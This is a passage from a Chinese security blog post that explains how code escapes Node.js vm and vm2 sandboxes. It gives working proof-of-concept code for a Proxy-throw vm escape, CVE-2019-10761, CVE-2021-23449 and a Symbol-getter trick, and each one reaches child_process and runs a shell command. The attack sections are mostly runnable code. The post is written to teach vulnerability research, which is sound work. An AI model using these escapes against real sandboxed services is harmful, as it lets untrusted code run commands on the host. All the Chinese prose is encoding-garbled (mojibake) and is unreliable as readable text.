<p>å¦‚æœæ²™ç®±çš„è¿”å›å€¼è¿”å›çš„æ˜¯æˆ‘ä»¬æ— æ³•åˆ©ç”¨çš„å¯¹è±¡æˆ–è€…æ²¡æœ‰è¿”å›å€¼åº”è¯¥æ€ä¹ˆè¿›è¡Œé€ƒé€¸å‘¢ï¼Ÿ</p>
<p>æˆ‘ä»¬å¯ä»¥å€ŸåŠ©å¼‚å¸¸ï¼Œå°†æ²™ç®±å†…çš„å¯¹è±¡æŠ›å‡ºå»ï¼Œç„¶ååœ¨å¤–éƒ¨è¾“å‡ºï¼š</p>
<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210171950196.png"></p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">"vm"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> script = </span><br><span class="line"><span class="string">`</span></span><br><span class="line"><span class="string">    throw new Proxy({}, {</span></span><br><span class="line"><span class="string">        get: function(){</span></span><br><span class="line"><span class="string">            const cc = arguments.callee.caller;</span></span><br><span class="line"><span class="string">            const p = (cc.constructor.constructor('return process'))();</span></span><br><span class="line"><span class="string">            return p.mainModule.require('child_process').execSync('whoami').toString();</span></span><br><span class="line"><span class="string">        }</span></span><br><span class="line"><span class="string">    })</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">try</span> {</span><br><span class="line">    vm.<span class="title function_">runInContext</span>(script, vm.<span class="title function_">createContext</span>(<span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>)));</span><br><span class="line">}<span class="keyword">catch</span>(e) {</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"error:"</span> + e) </span><br><span class="line">} </span><br></pre></td></tr></tbody></table></figure>

<p>è¿™é‡Œæˆ‘ä»¬ç”¨catchæ•è·åˆ°äº†throwå‡ºçš„proxyå¯¹è±¡ï¼Œåœ¨console.logæ—¶ç”±äºå°†å­—ç¬¦ä¸²ä¸å¯¹è±¡æ‹¼æ¥ï¼Œå°†æŠ¥é”™ä¿¡æ¯å’Œrceçš„å›æ˜¾ä¸€èµ·å¸¦äº†å‡ºæ¥ã€‚</p>
<h2 id="0x06-vm2"><a href="#0x06-vm2" class="headerlink" title="0x06 vm2"></a><strong>0x06 vm2</strong></h2><p>é€šè¿‡ä¸Šé¢å‡ ä¸ªä¾‹å­å¯ä»¥çœ‹å‡ºæ¥vmæ²™ç®±éš”ç¦»åŠŸèƒ½è¾ƒå¼±ï¼Œæœ‰å¾ˆå¤šé€ƒé€¸çš„æ–¹æ³•ï¼Œæ‰€ä»¥ç¬¬ä¸‰æ–¹åŒ…vm2åœ¨vmçš„åŸºç¡€ä¸Šåšäº†ä¸€äº›ä¼˜åŒ–ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹è¿™äº›ä¼˜åŒ–å…·ä½“æ˜¯æ€ä¹ˆå®ç°çš„ã€‚</p>
<p>å®‰è£…vm2åŒ…ï¼š</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install vm2</span><br></pre></td></tr></tbody></table></figure>

<p>æ•´ä¸ªvm2åŒ…ä¸‹æ˜¯è¿™æ ·çš„ç»“æ„ï¼š</p>
<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210181648329.png"></p>
<ul>
<li><p><code>cli.js</code>å®ç°äº†å¯ä»¥åœ¨å‘½ä»¤è¡Œä¸­è°ƒç”¨vm2 ä¹Ÿå°±æ˜¯binä¸‹çš„vm2ã€‚</p>
</li>
<li><p><code>contextify.js</code>å°è£…äº†ä¸‰ä¸ªå¯¹è±¡ï¼š<code>Contextify Decontextify propertyDescriptor</code>ï¼Œå¹¶ä¸”é’ˆå¯¹globalçš„Bufferç±»è¿›è¡Œäº†ä»£ç†ã€‚</p>
</li>
<li><p><code>main.js</code> æ˜¯vm2æ‰§è¡Œçš„å…¥å£ï¼Œå¯¼å‡ºäº†<code>NodeVM VM </code>è¿™ä¸¤ä¸ªæ²™ç®±ç¯å¢ƒï¼Œè¿˜æœ‰ä¸€ä¸ª<code>VMScript</code>å®é™…ä¸Šæ˜¯å°è£…äº†<code>vm.Script</code>ã€‚</p>
</li>
<li><p><code>sandbox.js</code>é’ˆå¯¹globalçš„ä¸€äº›å‡½æ•°å’Œå˜é‡è¿›è¡Œäº†æ‹¦æˆªï¼Œæ¯”å¦‚<code>setTimeoutï¼ŒsetInterval</code>ç­‰</p>
</li>
</ul>
<p>vm2ç›¸æ¯”vmåšå‡ºå¾ˆå¤§çš„æ”¹è¿›ï¼Œå…¶ä¸­ä¹‹ä¸€å°±æ˜¯åˆ©ç”¨äº†es6æ–°å¢çš„proxyç‰¹æ€§ï¼Œä»è€Œä½¿ç”¨é’©å­æ‹¦æˆªå¯¹<code>constructorå’Œ__proto__</code>è¿™äº›å±æ€§çš„è®¿é—®ã€‚</p>
<p>å…ˆç”¨vm2æ¼”ç¤ºä¸€ä¸‹ï¼š</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> {<span class="variable constant_">VM</span>, <span class="title class_">VMScript</span>} = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> <span class="title class_">VMScript</span>(<span class="string">"let a = 2;a;"</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>((<span class="keyword">new</span> <span class="title function_">VM</span>()).<span class="title function_">run</span>(script));</span><br></pre></td></tr></tbody></table></figure>

<p><code>VM</code>æ˜¯vm2åœ¨vmçš„åŸºç¡€ä¸Šå°è£…çš„ä¸€ä¸ªè™šæ‹Ÿæœºï¼Œæˆ‘ä»¬åªéœ€è¦å®ä¾‹åŒ–åè°ƒç”¨å…¶ä¸­çš„runæ–¹æ³•å°±å¯ä»¥è¿è¡Œä¸€æ®µè„šæœ¬ã€‚</p>
<p>é‚£ä¹ˆvm2åœ¨è¿è¡Œè¿™ä¸¤è¡Œä»£ç æ—¶éƒ½åšäº†ä»€ä¹ˆäº‹ï¼š</p>
<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210181709570.png"></p>
<p>å¯ä»¥å‘ç°ç›¸æ¯”äºvmçš„æ²™ç®±ç¯å¢ƒï¼Œvm2æœ€é‡è¦çš„ä¸€æ­¥å°±æ˜¯å¼•å…¥<code>sandbox.js</code>å¹¶é’ˆå¯¹contextåšå°è£…ã€‚</p>
<p>é‚£ä¹ˆvm2å…·ä½“æ˜¯æ€ä¹ˆå®ç°å¯¹contextçš„å°è£…ï¼Ÿ</p>
<p>vm2å‡ºç°è¿‡å¤šæ¬¡é€ƒé€¸çš„é—®é¢˜ï¼Œæ‰€ä»¥ç°æœ‰çš„ä»£ç è¢«è¿›è¡Œäº†å¤§é‡ä¿®æ”¹ï¼Œä¸ºäº†æ–¹ä¾¿åˆ†æéœ€è¦ä½¿ç”¨è¾ƒè€ç‰ˆæœ¬çš„vm2ï¼Œä½†githubä¸Šè²Œä¼¼å°†3.9ä»¥å‰çš„ç‰ˆæœ¬å…¨éƒ½åˆ é™¤äº†ï¼Œæ‰€ä»¥æˆ‘è¿™é‡Œä¹Ÿæ‰¾ä¸åˆ°å¯¹åº”çš„èµ„æºäº†ï¼Œä»£ç åˆ†æä¹Ÿæ¯”è¾ƒéº»çƒ¦ï¼Œç›´æ¥ç§»æ­¥é“¾æ¥ï¼š</p>
<p><a class="link" target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/207283#h2-1">vm2å®ç°åŸç†åˆ†æ-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="0x07-vm2ä¸­çš„æ²™ç®±ç»•è¿‡"><a href="#0x07-vm2ä¸­çš„æ²™ç®±ç»•è¿‡" class="headerlink" title="0x07 vm2ä¸­çš„æ²™ç®±ç»•è¿‡"></a><strong>0x07 vm2ä¸­çš„æ²™ç®±ç»•è¿‡</strong></h2><h3 id="CVE-2019-10761"><a href="#CVE-2019-10761" class="headerlink" title="CVE-2019-10761"></a><strong>CVE-2019-10761</strong></h3><p>è¯¥æ¼æ´è¦æ±‚vm2ç‰ˆæœ¬&lt;=3.6.10</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"><span class="keyword">const</span> {<span class="variable constant_">VM</span>} = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`</span></span><br><span class="line"><span class="string">const f = Buffer.prototype.write;</span></span><br><span class="line"><span class="string">const ft = {</span></span><br><span class="line"><span class="string">		length: 10,</span></span><br><span class="line"><span class="string">		utf8Write(){</span></span><br><span class="line"><span class="string">			</span></span><br><span class="line"><span class="string">		}</span></span><br><span class="line"><span class="string">}</span></span><br><span class="line"><span class="string">function r(i){</span></span><br><span class="line"><span class="string">	var x = 0;</span></span><br><span class="line"><span class="string">	try{</span></span><br><span class="line"><span class="string">		x = r(i);</span></span><br><span class="line"><span class="string">	}catch(e){}</span></span><br><span class="line"><span class="string">	if(typeof(x)!=='number')</span></span><br><span class="line"><span class="string">		return x;</span></span><br><span class="line"><span class="string">	if(x!==i)</span></span><br><span class="line"><span class="string">		return x+1;</span></span><br><span class="line"><span class="string">	try{</span></span><br><span class="line"><span class="string">		f.call(ft);</span></span><br><span class="line"><span class="string">	}catch(e){</span></span><br><span class="line"><span class="string">		return e;</span></span><br><span class="line"><span class="string">	}</span></span><br><span class="line"><span class="string">	return null;</span></span><br><span class="line"><span class="string">}</span></span><br><span class="line"><span class="string">var i=1;</span></span><br><span class="line"><span class="string">while(1){</span></span><br><span class="line"><span class="string">	try{</span></span><br><span class="line"><span class="string">		i=r(i).constructor.constructor("return process")();</span></span><br><span class="line"><span class="string">		break;</span></span><br><span class="line"><span class="string">	}catch(x){</span></span><br><span class="line"><span class="string">		i++;</span></span><br><span class="line"><span class="string">	}</span></span><br><span class="line"><span class="string">}</span></span><br><span class="line"><span class="string">i.mainModule.require("child_process").execSync("whoami").toString()</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">try</span>{</span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">new</span> <span class="title function_">VM</span>().<span class="title function_">run</span>(untrusted));</span><br><span class="line">}<span class="keyword">catch</span>(x){</span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">log</span>(x);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>è¿™ä¸ªé“¾å­åœ¨pç‰›çš„çŸ¥è¯†æ˜Ÿçƒä¸Šæœ‰ï¼Œå¾ˆæŠ½è±¡ï¼Œæ²™ç®±é€ƒé€¸è¯´åˆ°åº•å°±æ˜¯è¦ä»æ²™ç®±å¤–è·å–ä¸€ä¸ªå¯¹è±¡ï¼Œç„¶åè·å¾—è¿™ä¸ªå¯¹è±¡çš„constructorå±æ€§ï¼Œè¿™æ¡é“¾å­è·å–æ²™ç®±å¤–å¯¹è±¡çš„æ–¹æ³•æ˜¯ åœ¨æ²™ç®±å†…ä¸æ–­é€’å½’ä¸€ä¸ªå‡½æ•°ï¼Œå½“é€’å½’æ¬¡æ•°è¶…è¿‡å½“å‰ç¯å¢ƒçš„æœ€å¤§å€¼æ—¶ï¼Œæˆ‘ä»¬æ­£å¥½è°ƒç”¨æ²™ç®±å¤–çš„å‡½æ•°ï¼Œå°±ä¼šå¯¼è‡´æ²™ç®±å¤–çš„è°ƒç”¨æ ˆè¢«çˆ†æ‰ï¼Œæˆ‘ä»¬åœ¨æ²™ç®±å†…catchè¿™ä¸ªå¼‚å¸¸å¯¹è±¡ï¼Œå°±æ‹¿åˆ°äº†ä¸€ä¸ªæ²™ç®±å¤–çš„å¯¹è±¡ã€‚ä¸¾ä¸ªä¾‹å­ï¼š</p>
<p>å‡è®¾å½“å‰ç¯å¢ƒä¸‹æœ€å¤§é€’å½’å€¼ä¸º1000ï¼Œæˆ‘ä»¬é€šè¿‡ç¨‹åºæ§åˆ¶é€’å½’999æ¬¡ï¼ˆæ³¨æ„è¿™é‡Œè¯´çš„é€’å½’å€¼ä¸æ˜¯ä¸€ç›´è°ƒç”¨åŒä¸€ä¸ªå‡½æ•°çš„æœ€å¤§å€¼ï¼Œè€Œæ˜¯å•æ¬¡ç¨‹åºå†…è°ƒç”¨å‡½æ•°æ¬¡æ•°çš„æœ€å¤§å€¼ï¼Œä¹Ÿå°±æ˜¯è°ƒç”¨æ ˆçš„æœ€å¤§å€¼ï¼‰ï¼š</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">r</span>(i);      <span class="comment">// è¯¥å‡½æ•°é€’å½’999æ¬¡</span></span><br><span class="line"></span><br><span class="line">f.<span class="title function_">call</span>(ft);    <span class="comment">// é€’å½’åˆ°ç¬¬1000æ¬¡æ—¶è°ƒç”¨fè¿™ä¸ªå‡½æ•°ï¼Œfä¸ºBuffer.prototype.writeï¼Œå°±æ˜¯ä¸‹é¢å›¾ç‰‡çš„è¿™ä¸ªå‡½æ•°</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">this</span>.<span class="title function_">utf8Write</span>()   <span class="comment">// é€’å½’åˆ°1001æ¬¡æ—¶ä¸ºè¯¥å‡½æ•°ï¼Œæ˜¯ä¸€ä¸ªå¤–éƒ¨å‡½æ•°ï¼Œæ‰€ä»¥çˆ†æ ˆæ—¶æ•æ‰çš„å¼‚å¸¸ä¹Ÿæ˜¯æ²™ç®±å¤–ï¼Œä»è€Œè¿”å›äº†ä¸€ä¸ªæ²™ç®±					å¤–çš„å¼‚å¸¸å¯¹è±¡</span></span><br></pre></td></tr></tbody></table></figure>

<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210182034077.png"></p>
<h3 id="CVE-2021-23449"><a href="#CVE-2021-23449" class="headerlink" title="CVE-2021-23449"></a><strong>CVE-2021-23449</strong></h3><p> è¿™ä¸ªæ¼æ´åœ¨snykè§£é‡Šæ˜¯åŸå‹é“¾æ±¡æŸ“å¯¼è‡´çš„æ²™ç®±é€ƒé€¸ï¼Œä½†pç‰›åœ¨çŸ¥è¯†æ˜Ÿçƒé‡Œå‘äº†å…¶å®æ˜¯å¦å¤–çš„åŸå› </p>
<p><a class="link" target="_blank" rel="noopener" href="https://security.snyk.io/vuln/SNYK-JS-VM2-1585918">Sandbox Bypass in vm2 | CVE-2021-23449 | Snyk<i class="fas fa-external-link-alt"></i></a> </p>
<p>pocï¼š</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> res = <span class="keyword">import</span>(<span class="string">'./foo.js'</span>)</span><br><span class="line">res.<span class="property">toString</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">"return this"</span></span>)(<span class="params"></span>).<span class="property">process</span>.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">"child_process"</span>).<span class="title function_">execSync</span>(<span class="string">"whoami"</span>).<span class="title function_">toString</span>();</span><br></pre></td></tr></tbody></table></figure>

<p>import()åœ¨JavaScriptä¸­æ˜¯ä¸€ä¸ªè¯­æ³•ç»“æ„ï¼Œä¸æ˜¯å‡½æ•°ï¼Œæ²¡æ³•é€šè¿‡ä¹‹å‰å¯¹requireè¿™ç§å‡½æ•°å¤„ç†ç›¸åŒçš„æ–¹æ³•æ¥å¤„ç†å®ƒï¼Œå¯¼è‡´å®é™…ä¸Šæˆ‘ä»¬è°ƒç”¨import()çš„ç»“æœå®é™…ä¸Šæ˜¯æ²¡æœ‰ç»è¿‡æ²™ç®±çš„ï¼Œæ˜¯ä¸€ä¸ªå¤–éƒ¨å˜é‡ã€‚ æˆ‘ä»¬å†è·å–è¿™ä¸ªå˜é‡çš„å±æ€§å³å¯ç»•è¿‡æ²™ç®±ã€‚ vm2å¯¹æ­¤çš„ä¿®å¤æ–¹æ³•ä¹Ÿå¾ˆç²—ç³™ï¼Œæ­£åˆ™åŒ¹é…å¹¶æ›¿æ¢äº†\bimport\bå…³é”®å­—ï¼Œåœ¨ç¼–è¯‘å¤±è´¥çš„æ—¶å€™ï¼ŒæŠ¥Dynamic Import not supportedé”™è¯¯ã€‚</p>
<h3 id="çŸ¥è¯†æ˜Ÿçƒä¸Šçš„å¦å¤–ä¸€ä¸ªtrick"><a href="#çŸ¥è¯†æ˜Ÿçƒä¸Šçš„å¦å¤–ä¸€ä¸ªtrick" class="headerlink" title="çŸ¥è¯†æ˜Ÿçƒä¸Šçš„å¦å¤–ä¸€ä¸ªtrick"></a><strong>çŸ¥è¯†æ˜Ÿçƒä¸Šçš„å¦å¤–ä¸€ä¸ªtrick</strong></h3><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Symbol</span> = {</span><br><span class="line">  <span class="keyword">get</span> <span class="title function_">toStringTag</span>(){</span><br><span class="line">    <span class="keyword">throw</span> <span class="function"><span class="params">f</span>=&gt;</span>f.<span class="title function_">constructor</span>(<span class="params"><span class="string">"return process"</span></span>)(<span class="params"></span>)</span><br><span class="line">  }</span><br><span class="line">};</span><br><span class="line"><span class="keyword">try</span>{</span><br><span class="line">  <span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="keyword">new</span> <span class="title class_">Map</span>());</span><br><span class="line">}<span class="keyword">catch</span>(f){</span><br><span class="line">  <span class="title class_">Symbol</span> = {};</span><br><span class="line">  <span class="title function_">f</span>(<span class="function">()=&gt;</span>{}).<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">"child_process"</span>).<span class="title function_">execSync</span>(<span class="string">"whoami"</span>).<span class="title function_">toString</span>();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>åœ¨vm2çš„åŸç†ä¸­æåˆ°vm2ä¼šä¸ºå¯¹è±¡é…ç½®ä»£ç†å¹¶åˆå§‹åŒ–ï¼Œå¦‚æœå¯¹è±¡æ˜¯ä»¥ä¸‹ç±»å‹ï¼š</p>
<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210231528122.png"></p>
<p>å°±ä¼šreturn <code>Decontextify.instance</code> å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¸­ç”¨åˆ°äº†Symbolå…¨å±€å¯¹è±¡ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åŠ«æŒSymbolå¯¹è±¡çš„getterå¹¶æŠ›å‡ºå¼‚å¸¸ï¼Œå†åœ¨æ²™ç®±å†…æ‹¿åˆ°è¿™ä¸ªå¼‚å¸¸å¯¹è±¡å°±å¯ä»¥äº†</p>
<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210231530718.png"></p>

            </div>

            

            
                <ul class="post-tags-box">
                    
                        <li class="tag-item">
                            <a href="/tags/NodeJs/">#NodeJs</a>&nbsp;
                        </li>
                    
                </ul>
            

            
                <div class="article-nav">
                    
                        <div class="article-prev">
                            <a class="prev"
                               rel="prev"
                               href="/2023/04/21/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"
                            >
                            <span class="left arrow-icon flex-center">
                              <i class="fas fa-chevron-left"></i>
                            </span>
                                <span class="title flex-center">
                                <span class="post-nav-title-item">NodejsåŸå‹é“¾æ±¡æŸ“</span>
                                <span class="post-nav-item">ä¸Šä¸€ç¯‡</span>
                            </span>
                            </a>
                        </div>
                    
                    
                </div>
            

            
                <div class="comment-container">
                    
<div class="comments-container">
    <div id="comments-anchor"></div>
    <div class="comment-area-title">
        <i class="fas fa-comments"></i>&nbsp;è¯„è®º
    </div>
    
        
            

    <div class="valine-container">
        <script data-pjax src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
        <div id="vcomments"></div>
        <script data-pjax>
          function loadValine() {

            const config = {
              el: '#vcomments',
              appId: 'yCemvr5nGXrJlWRCN3SLWLLy-MdYXbMMI',
              appKey: '7gIuYJ9YQk94en6wRudankYd',
              meta: ['nick', 'mail', 'link'],
              avatar: 'wavatar',
              enableQQ: true,
              placeholder: 'Hi speak somethingï¼',
              lang: 'zh-CN'.toLowerCase()
            }

            if ('https://ycemvr5n.api.lncldglobal.com') {
              config.serverURLs = 'https://ycemvr5n.api.lncldglobal.com'
            }

            new Valine(config)

            function getAuthor(language) {
              switch (language) {
                case 'en':
                  return 'Author'
                case 'zh-CN':
                  return 'åšä¸»'
                default:
                  return 'Master'
              }
            }

            // Add "Author" identify
            const getValineDomTimer = setInterval(() => {
              const vcards = document.querySelectorAll('#vcomments .vcards .vcard')
              if (vcards.length > 0) {
                let author = 'y1zh3e7'

                if (author) {
                  for (let vcard of vcards) {
                    const vnick_dom = vcard.querySelector('.vhead .vnick')
                    const vnick = vnick_dom.innerHTML
                    if (vnick === author) {
                      vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
                    }
                  }
                }
                clearInterval(getValineDomTimer)
              } else {
                clearInterval(getValineDomTimer)
              }
            }, 2000)
          }

          if ('true' === 'true') {
            const loadValineTimeout = setTimeout(() => {
              loadValine()
              clearTimeout(loadValineTimeout)
            }, 1000)
          } else {
            window.addEventListener('DOMContentLoaded', loadValine)
          }
        </script>
    </div>



        
    
</div>

                </div>
            
        </div>

        
            <div class="toc-content-container">
                <div class="post-toc-wrap">
    <div class="post-toc">
        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%9D%E8%AF%86"><span class="nav-text">0x01 æ²™ç®±é€ƒé€¸åˆè¯†</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-Node%E5%B0%86%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%89%A7%E8%A1%8C%E4%B8%BA%E4%BB%A3%E7%A0%81"><span class="nav-text">0x02 Nodeå°†å­—ç¬¦ä¸²æ‰§è¡Œä¸ºä»£ç </span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-Nodejs%E4%BD%9C%E7%94%A8%E5%9F%9F"><span class="nav-text">0x03 Nodejsä½œç”¨åŸŸ</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="nav-text">0x04 vmæ²™ç®±é€ƒé€¸</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%85%B6%E4%BB%96%E6%83%85%E5%86%B5"><span class="nav-text">0x05 vmæ²™ç®±é€ƒé€¸çš„ä¸€äº›å…¶ä»–æƒ…å†µ</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-vm2"><span class="nav-text">0x06 vm2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-vm2%E4%B8%AD%E7%9A%84%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87"><span class="nav-text">0x07 vm2ä¸­çš„æ²™ç®±ç»•è¿‡</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2019-10761"><span class="nav-text">CVE-2019-10761</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2021-23449"><span class="nav-text">CVE-2021-23449</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E6%98%9F%E7%90%83%E4%B8%8A%E7%9A%84%E5%8F%A6%E5%A4%96%E4%B8%80%E4%B8%AAtrick"><span class="nav-text">çŸ¥è¯†æ˜Ÿçƒä¸Šçš„å¦å¤–ä¸€ä¸ªtrick</span></a></li></ol></li></ol>
    </div>
</div>

            </div>
        
    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom">
            
<footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
                <span>2023</span> -
            
            2023
            
                &nbsp;<i class="fas fa-heart icon-animate"></i>
                &nbsp;<a href="/">y1zh3e7</a>
            
        </div>
        
            <script async data-pjax
                    src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="website-count info-item">
                
                    è®¿é—®äººæ•°&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
                
                
                    æ€»è®¿é—®é‡&nbsp;<span id="busuanzi_value_site_pv"></span>
                
            </div>
        
        <div class="theme-info info-item">
            ç”± <a target="_blank" href="https://hexo.io">Hexo</a> é©±åŠ¨&nbsp;|&nbsp;ä¸»é¢˜&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a>
        </div>
        
        
    </div>
</footer>

        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="tools-list">
        <!-- TOC aside toggle -->
        
            <li class="tools-item flex-center toggle-show-toc">
                <i class="fas fa-list"></i>
            </li>
        

        <!-- go comment -->
        
            <li class="tools-item flex-center go-to-comments">
                <i class="fas fa-comment"></i>
                <span class="post-comments-count"></span>
            </li>
        
    </ul>
</div>

        </div>
    

    <div class="right-bottom-side-tools">
        <div class="side-tools-container">
    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        

        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>
        
            <li class="tools-item tool-scroll-to-top flex-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
    </ul>
</div>

    </div>

    <div class="zoom-in-image-mask">
    <img class="zoom-in-image">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="æœç´¢..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="close-popup-btn">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

</main>



<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script>




